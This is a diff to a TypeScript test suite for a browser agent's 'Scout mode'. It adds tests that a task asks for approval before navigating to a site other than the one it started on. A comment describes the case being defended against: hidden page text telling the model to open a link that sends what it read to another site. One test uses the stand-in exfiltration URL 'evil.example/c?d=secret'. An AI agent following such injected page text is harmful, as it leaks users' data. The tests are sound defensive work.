@@ -59,7 +59,7 @@ interface Harness {
 
 function harness(
   provider: ProviderClient,
-  opts: { confirm?: (r: ConfirmRequest) => Promise<ConfirmDecision>; access?: Partial<PageAccess>; url?: string; screenshot?: boolean; onAct?: (a: TaskAction) => void; navigate?: (url: string) => Promise<void> } = {},
+  opts: { confirm?: (r: ConfirmRequest) => Promise<ConfirmDecision>; access?: Partial<PageAccess>; url?: string; screenshot?: boolean; onAct?: (a: TaskAction) => void; navigate?: (url: string) => Promise<void>; goal?: string } = {},
 ): Harness {
   const h: Harness = { acts: [], opened: [], overlay: [], events: [], logs: [], icons: [], asked: [], timeline: [], control: new AgentControl(), deps: undefined as never };
   let access = parsePageAccess(opts.access ?? {});
@@ -68,7 +68,7 @@ function harness(
   h.deps = {
     provider,
     model: "m",
-    goal: "Buy the widget",
+    goal: opts.goal ?? "Buy the widget",
     control: h.control,
     page: {
       snapshot: async () => ({ ...SNAP, url: opts.url ?? SNAP.url }),
@@ -165,7 +165,8 @@ describe("Scout mode runner", () => {
       [act([{ type: "navigate", url: "google.com" }, { type: "click", target: { ref: "e3" } }])],
       [finish("On Google.")],
     ]);
-    const h = harness(provider);
+    // The task names google.com, so opening it is not asked (audit 2026-10-24).
+    const h = harness(provider, { goal: "go to Google.com" });
     const out = await runTask(h.deps);
     expect(out).toMatchObject({ status: "done", summary: "On Google." });
     expect(h.opened).toEqual(["https://google.com/"]);
@@ -190,9 +191,37 @@ describe("Scout mode runner", () => {
     expect(textOf(provider.seen[1]!.messages[2]!.content)).toContain("blocked.test is blocked in Settings");
   });
 
+  // Audit 2026-10-24: hidden page text can tell the model to open a link that
+  // carries what Scout read to another site, so a site the task is not on is asked first.
+  it("asks before opening another site; a denial leaves the tab alone, and an allowed site is not asked again", async () => {
+    const leak = "https://evil.example/c?d=secret";
+    const denied = scripted([[act([{ type: "navigate", url: leak }])], [finish("x")]]);
+    const h = harness(denied);
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(1);
+    expect(h.asked[0]).toMatchObject({ kind: "leave_site", site: "shop.test" });
+    expect(h.asked[0]!.reason).toContain("evil.example");
+    expect(h.opened).toEqual([]);
+    expect(textOf(denied.seen[1]!.messages[2]!.content)).toContain("approval_denied");
+
+    const twice = scripted([[act([{ type: "navigate", url: "https://other.example/a" }])], [act([{ type: "navigate", url: "https://www.other.example/b" }])], [finish("x")]]);
+    const ok = harness(twice, { confirm: async () => "once" });
+    await runTask(ok.deps);
+    expect(ok.asked).toHaveLength(1);
+    expect(ok.opened).toEqual(["https://other.example/a", "https://www.other.example/b"]);
+  });
+
+  it("opens pages on the site the task started on without asking", async () => {
+    const provider = scripted([[act([{ type: "navigate", url: "https://checkout.shop.test/pay" }])], [finish("x")]]);
+    const h = harness(provider);
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(0);
+    expect(h.opened).toEqual(["https://checkout.shop.test/pay"]);
+  });
+
   it("reports a failed navigation instead of hanging", async () => {
     const provider = scripted([[act([{ type: "navigate", url: "https://google.com" }])], [finish("x")]]);
-    const h = harness(provider, { navigate: async () => Promise.reject(new Error("tabs.update unavailable")) });
+    const h = harness(provider, { goal: "search google.com", navigate: async () => Promise.reject(new Error("tabs.update unavailable")) });
     await runTask(h.deps);
     expect(textOf(provider.seen[1]!.messages[2]!.content)).toContain("Scout could not open that address in this tab.");
   });
